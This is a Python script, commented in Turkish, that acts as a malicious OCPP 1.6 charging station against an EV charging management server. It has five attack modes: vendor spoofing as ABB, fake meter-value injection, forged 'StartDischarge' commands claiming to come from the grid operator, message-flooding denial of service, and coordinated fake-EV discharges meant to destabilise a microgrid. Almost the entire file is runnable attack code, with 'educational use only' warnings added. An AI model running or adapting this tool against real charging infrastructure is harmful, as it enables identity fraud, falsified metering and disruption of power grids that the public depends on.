#!/usr/bin/env python3
"""
V2G Protokol Manipülasyon Saldırısı Simülatörü
V2G Protocol Manipulation for Microgrid Destabilization

Bu simülatör:
1. OCPP/ISO 15118 protokollerini manipüle eder
2. Sahte V2G komutları enjekte eder
3. Koordineli saldırı ile şebeke dengesizliği oluşturur
4. Çeşitli saldırı modlarını destekler

UYARI: Bu simülatör sadece eğitim amaçlıdır!
"""

import asyncio
import logging
import json
import random
import math
from datetime import datetime, timezone
from enum import Enum
import websockets
from ocpp.v16 import ChargePoint as cp
from ocpp.v16 import call
from ocpp.v16.enums import RegistrationStatus

# Loglama ayarları
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Saldırı Tipleri"""
    INJECTION = "injection"      # Sahte veri enjeksiyonu
    FLOODING = "flooding"        # DoS saldırısı
    DESTABILIZE = "destabilize"  # Şebeke dengesizliği
    OSCILLATION = "oscillation"  # V2G osilasyonu
    SPOOFING = "spoofing"        # Kimlik sahteciliği


class MaliciousStation(cp):
    """Kötü Amaçlı Şarj İstasyonu Simülatörü"""
    
    def __init__(self, station_id, websocket, attack_type=AttackType.INJECTION):
        super().__init__(station_id, websocket)
        self.station_id = station_id
        self.attack_type = attack_type
        self.attack_count = 0
        self.energy_exported = 0
        self.fake_power = 0
    
    async def send_boot_notification(self):
        """Boot notification (görünüşte meşru)"""
        # Spoofing saldırısı: Meşru üretici ismi kullan
        if self.attack_type == AttackType.SPOOFING:
            vendor = "ABB"  # Meşru üretici gibi görün
            model = "Terra AC Wallbox"
        else:
            vendor = "BSG-Attack"
            model = "Malicious-V2G"
        
        request = call.BootNotification(
            charge_point_model=model,
            charge_point_vendor=vendor
        )
        
        logger.info(f"🎭 [SALDIRI] Boot notification gönderiliyor...")
        logger.info(f"   Sahte Üretici: {vendor}")
        logger.info(f"   Sahte Model: {model}")
        
        try:
            response = await self.call(request)
            if response.status == RegistrationStatus.accepted:
                logger.info(f"✅ CSMS kandırıldı! Saldırgan kabul edildi.")
                return response.interval
            else:
                logger.warning(f"⚠️ CSMS reddetti: {response.status}")
                return None
        except Exception as e:
            logger.error(f"❌ Boot hatası: {e}")
            return None
    
    async def send_heartbeat_loop(self, interval):
        """Normal heartbeat (şüphe çekmemek için)"""
        while True:
            await asyncio.sleep(interval)
            try:
                await self.call(call.Heartbeat())
            except:
                pass
    
    async def inject_fake_v2g_data(self, power_kw, duration_sec=5):
        """Sahte V2G verisi enjekte et"""
        self.attack_count += 1
        self.fake_power = power_kw * 1000  # W
        
        logger.info(f"\n{'🚨'*20}")
        logger.info(f"[SALDIRI #{self.attack_count}] SAHTE V2G VERİSİ ENJEKSİYONU")
        logger.info(f"{'🚨'*20}")
        logger.info(f"   Sahte Güç: {power_kw} kW")
        logger.info(f"   Hedef: Mikro şebekeyi dengesizleştir")
        
        # Sahte MeterValues gönder
        energy_wh = (self.fake_power * duration_sec) / 3600
        self.energy_exported += energy_wh
        
        meter_value = [{
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'sampled_value': [
                {
                    'value': str(int(self.energy_exported)),
                    'context': 'Sample.Periodic',
                    'format': 'Raw',
                    'measurand': 'Energy.Active.Export.Register',
                    'unit': 'Wh'
                },
                {
                    'value': str(int(self.fake_power)),
                    'context': 'Sample.Periodic',
                    'format': 'Raw',
                    'measurand': 'Power.Active.Export',
                    'unit': 'W'
                }
            ]
        }]
        
        request = call.MeterValues(
            connector_id=1,
            meter_value=meter_value
        )
        
        try:
            await self.call(request)
            logger.info(f"   ✅ Sahte veri enjekte edildi!")
            logger.info(f"   Toplam sahte enerji: {self.energy_exported/1000:.2f} kWh")
        except Exception as e:
            logger.error(f"   ❌ Enjeksiyon başarısız: {e}")
    
    async def send_fake_v2g_command(self, power_kw):
        """Sahte V2G komutu gönder"""
        self.attack_count += 1
        
        data = {
            'command': 'StartDischarge',
            'power_kw': power_kw,
            'priority': 'HIGH',
            'source': 'GridOperator',  # Sahte kaynak
            'timestamp': datetime.now(timezone.utc).isoformat()
        }
        
        request = call.DataTransfer(
            vendor_id='GridServices',  # Sahte vendor
            message_id='V2G_StartDischarge',
            data=json.dumps(data)
        )
        
        logger.info(f"\n[SALDIRI #{self.attack_count}] SAHTE V2G KOMUTU")
        logger.info(f"   Sahte Komut: StartDischarge")
        logger.info(f"   Sahte Kaynak: GridOperator")
        logger.info(f"   Güç: {power_kw} kW")
        
        try:
            response = await self.call(request)
            if response.status == 'Accepted':
                logger.info(f"   ✅ Sahte komut kabul edildi!")
            else:
                logger.warning(f"   ⚠️ Komut reddedildi: {response.status}")
        except Exception as e:
            logger.error(f"   ❌ Komut hatası: {e}")
    
    async def flooding_attack(self, messages_per_second=10, duration_sec=30):
        """DoS saldırısı - Aşırı mesaj göndererek sunucuyu bunalt"""
        logger.info(f"\n{'💥'*20}")
        logger.info(f"[SALDIRI] FLOODING DoS SALDIRISI BAŞLIYOR")
        logger.info(f"{'💥'*20}")
        logger.info(f"   Hız: {messages_per_second} mesaj/saniye")
        logger.info(f"   Süre: {duration_sec} saniye")
        logger.info(f"   Toplam: ~{messages_per_second * duration_sec} mesaj")
        
        start_time = asyncio.get_event_loop().time()
        end_time = start_time + duration_sec
        message_count = 0
        
        while asyncio.get_event_loop().time() < end_time:
            for _ in range(messages_per_second):
                try:
                    # Rastgele mesaj tipleri
                    msg_type = random.choice(['meter', 'data', 'status'])
                    
                    if msg_type == 'meter':
                        await self.call(call.MeterValues(
                            connector_id=1,
                            meter_value=[{
                                'timestamp': datetime.now(timezone.utc).isoformat(),
                                'sampled_value': [{'value': str(random.randint(0, 100000))}]
                            }]
                        ))
                    elif msg_type == 'data':
                        await self.call(call.DataTransfer(
                            vendor_id='Flood',
                            data=json.dumps({'flood': random.random()})
                        ))
                    else:
                        await self.call(call.StatusNotification(
                            connector_id=1,
                            error_code='NoError',
                            status='Available'
                        ))
                    
                    message_count += 1
                except:
                    pass
            
            await asyncio.sleep(1)
            logger.info(f"   📊 Gönderilen: {message_count} mesaj")
        
        logger.info(f"\n✅ Flooding saldırısı tamamlandı: {message_count} mesaj gönderildi")
    
    async def oscillation_attack(self, cycles=10, power_kw=22):
        """V2G osilasyon saldırısı - Şebeke frekansını bozmak için"""
        logger.info(f"\n{'🔄'*20}")
        logger.info(f"[SALDIRI] V2G OSİLASYON SALDIRISI")
        logger.info(f"{'🔄'*20}")
        logger.info(f"   Döngü: {cycles}")
        logger.info(f"   Güç: ±{power_kw} kW")
        logger.info(f"   Hedef: Şebeke frekans dengesizliği")
        
        for cycle in range(cycles):
            # Pozitif faz (şebekeye gönder)
            logger.info(f"\n   [{cycle+1}/{cycles}] ⬆️ +{power_kw} kW (Şebekeye)")
            await self.inject_fake_v2g_data(power_kw, duration_sec=3)
            await asyncio.sleep(3)
            
            # Negatif faz (şebekeden çek)
            logger.info(f"   [{cycle+1}/{cycles}] ⬇️ Şarj moduna geç")
            await self.inject_fake_v2g_data(0, duration_sec=3)
            await asyncio.sleep(3)
        
        logger.info(f"\n✅ Osilasyon saldırısı tamamlandı: {cycles} döngü")
    
    async def coordinated_destabilization(self, num_fake_evs=5, power_per_ev=11):
        """Koordineli şebeke dengesizliği saldırısı"""
        logger.info(f"\n{'⚡'*20}")
        logger.info(f"[SALDIRI] KOORDİNELİ ŞEBEKE DENGESİZLİĞİ")
        logger.info(f"{'⚡'*20}")
        logger.info(f"   Sahte EV sayısı: {num_fake_evs}")
        logger.info(f"   EV başına güç: {power_per_ev} kW")
        logger.info(f"   Toplam saldırı gücü: {num_fake_evs * power_per_ev} kW")
        logger.info(f"   Hedef: Ani yük değişimi ile şebeke çökmesi")
        
        # Her "sahte EV" için ayrı mesaj gönder
        for ev_num in range(num_fake_evs):
            ev_id = f"FAKE_EV_{ev_num+1:03d}"
            logger.info(f"\n   🚗 {ev_id} saldırıya katılıyor...")
            
            # Sahte V2G verisi
            data = {
                'ev_id': ev_id,
                'power_kw': power_per_ev,
                'action': 'immediate_discharge',
                'bypass_safety': True  # Güvenlik bypass işareti
            }
            
            try:
                await self.call(call.DataTransfer(
                    vendor_id='V2G-Attack',
                    message_id='CoordinatedDischarge',
                    data=json.dumps(data)
                ))
                
                # Sahte MeterValues
                await self.inject_fake_v2g_data(power_per_ev, duration_sec=2)
                
            except Exception as e:
                logger.warning(f"   ⚠️ {ev_id} hatası: {e}")
            
            await asyncio.sleep(0.5)  # Kısa gecikme
        
        logger.info(f"\n{'⚡'*20}")
        logger.info(f"SALDIRI TAMAMLANDI!")
        logger.info(f"Toplam sahte güç enjekte edildi: {num_fake_evs * power_per_ev} kW")
        logger.info(f"{'⚡'*20}\n")
    
    async def start_attack(self):
        """Saldırıyı başlat"""
        logger.info(f"\n{'='*70}")
        logger.info(f"🎭 SALDIRI BAŞLATILIYOR")
        logger.info(f"{'='*70}")
        logger.info(f"   Saldırı Tipi: {self.attack_type.value}")
        logger.info(f"   İstasyon ID: {self.station_id}")
        logger.info(f"{'='*70}\n")
        
        await asyncio.sleep(3)
        
        if self.attack_type == AttackType.INJECTION:
            # Sürekli sahte veri enjeksiyonu
            for i in range(10):
                power = random.randint(10, 30)
                await self.inject_fake_v2g_data(power, duration_sec=5)
                await asyncio.sleep(5)
        
        elif self.attack_type == AttackType.FLOODING:
            await self.flooding_attack(messages_per_second=10, duration_sec=30)
        
        elif self.attack_type == AttackType.OSCILLATION:
            await self.oscillation_attack(cycles=10, power_kw=22)
        
        elif self.attack_type == AttackType.DESTABILIZE:
            await self.coordinated_destabilization(num_fake_evs=5, power_per_ev=11)
        
        elif self.attack_type == AttackType.SPOOFING:
            # Meşru komutmuş gibi V2G komutları gönder
            for _ in range(5):
                await self.send_fake_v2g_command(random.randint(10, 22))
                await asyncio.sleep(5)
        
        logger.info(f"\n{'='*70}")
        logger.info(f"📊 SALDIRI ÖZETİ")
        logger.info(f"{'='*70}")
        logger.info(f"   Toplam Saldırı: {self.attack_count}")
        logger.info(f"   Enjekte Edilen Enerji: {self.energy_exported/1000:.2f} kWh (sahte)")
        logger.info(f"{'='*70}\n")
    
    async def start(self):
        """İstasyonu başlat ve saldırıyı gerçekleştir"""
        interval = await self.send_boot_notification()
        
        if interval:
            await asyncio.gather(
                self.send_heartbeat_loop(interval),
                self.start_attack(),
                return_exceptions=True
            )
        else:
            logger.error("❌ Boot başarısız, saldırı yapılamıyor")


async def main():
    """Ana program"""
    import sys
    
    # Komut satırı argümanları
    attack_type = AttackType.INJECTION
    
    if len(sys.argv) > 1:
        arg = sys.argv[1].lower()
        if arg in ['--help', '-h']:
            print("""
V2G Protocol Manipulation Saldırısı Simülatörü

Kullanım:
  python v2g_attacker.py [saldırı-tipi]

Saldırı Tipleri:
  injection    - Sahte V2G verisi enjeksiyonu (varsayılan)
  flooding     - DoS saldırısı (aşırı mesaj)
  oscillation  - V2G osilasyonu (frekans dengesizliği)
  destabilize  - Koordineli şebeke dengesizliği
  spoofing     - Kimlik sahteciliği

Örnek:
  python v2g_attacker.py destabilize

UYARI: Bu araç sadece eğitim ve test amaçlıdır!
            """)
            return
        
        attack_map = {
            'injection': AttackType.INJECTION,
            'flooding': AttackType.FLOODING,
            'oscillation': AttackType.OSCILLATION,
            'destabilize': AttackType.DESTABILIZE,
            'spoofing': AttackType.SPOOFING
        }
        
        if arg in attack_map:
            attack_type = attack_map[arg]
        else:
            print(f"❌ Geçersiz saldırı tipi: {arg}")
            print("Geçerli tipler: injection, flooding, oscillation, destabilize, spoofing")
            return
    
    station_id = f"ATTACK_{datetime.now().strftime('%H%M%S')}"
    csms_url = f"ws://localhost:9000/{station_id}"
    
    logger.info("="*70)
    logger.info("🎭 V2G PROTOCOL MANIPULATION ATTACK SIMULATOR")
    logger.info("="*70)
    logger.warning("⚠️  UYARI: Bu araç sadece eğitim amaçlıdır!")
    logger.warning("⚠️  Gerçek sistemlere karşı kullanımı yasaktır!")
    logger.info("="*70)
    logger.info(f"   Saldırı Tipi: {attack_type.value}")
    logger.info(f"   Hedef CSMS: {csms_url}")
    logger.info("="*70)
    
    try:
        async with websockets.connect(
            csms_url,
            subprotocols=['ocpp1.6']
        ) as ws:
            logger.info("✅ CSMS'e bağlandı!")
            
            attacker = MaliciousStation(station_id, ws, attack_type)
            
            await asyncio.gather(
                cp.start(attacker),
                attacker.start(),
                return_exceptions=True
            )
            
    except websockets.exceptions.WebSocketException as e:
        logger.error(f"❌ Bağlantı hatası: CSMS çalışmıyor ({e})")
    except Exception as e:
        logger.error(f"❌ Hata: {e}", exc_info=True)


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Saldırı durduruldu")
